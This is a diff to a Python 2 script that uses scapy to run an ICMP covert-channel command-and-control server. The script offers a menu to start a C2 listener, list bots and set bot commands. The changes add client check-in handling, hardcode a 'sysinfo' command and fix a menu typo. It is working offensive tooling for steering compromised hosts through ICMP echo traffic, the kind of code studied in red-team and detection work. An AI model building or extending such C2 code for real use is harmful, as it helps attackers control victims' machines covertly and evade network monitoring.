@@ -16,11 +16,11 @@ from scapy.all import *
 def displayMenu():
 	print ""
 	print "Choose an option"
-        print "1) Start C2 listener"
+        if not active_children():
+		print "1) Start C2 listener"
         print "2) Show bots"
         print "3) Change bot command"
         print "q) Quit"
-        print "Option: "
 
 # Inerrupt handler to kill process cleanly
 def handler(signum, frame):
@@ -49,8 +49,11 @@ def c2main(command):
                                 	print "[*] Response sent to %s: %s" % (p['IP'].src,command)
                                 	#resp.show2()
                                 	send(resp)
-					disaplyMenu()
-                        	elif 'sysinfo' in request:
+					displayMenu()
+					print "Option: "
+                        	elif request == 'Checkin':
+					print "[*] %s checking in" % p['IP'].src
+				elif 'sysinfo' in request:
                         		sysinfo = request[8:]
                                 	print "[*] Received sysinfo from client: %s" % sysinfo
                                 	resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
@@ -58,7 +61,8 @@ def c2main(command):
                                 	print "[*] Response sent: Thanks"
                                 	send(resp)
 					displayMenu()      
-                        	else:   
+                        		print "Option: "
+				else:   
                                         print "[**] Client not recognized"
 					displayMenu()
                 	except:
@@ -80,9 +84,9 @@ def main(argv):
 	while True:
 		signal.signal(signal.SIGINT, handler)
 		displayMenu()
-		option = raw_input()
+		option = raw_input("Option: ")
 		if option == '1':
-			command = raw_input("Enter a command: ")
+			command = 'sysinfo'
 			if active_children():
 				print "[*] Capture running. Stopping first."
 				for proc in active_children():		
@@ -131,5 +135,6 @@ def main(argv):
 			sys.exit()
 		else:
 			print "Invalid Option...please try again"
+
 if __name__ == "__main__":
    main(sys.argv[1:])
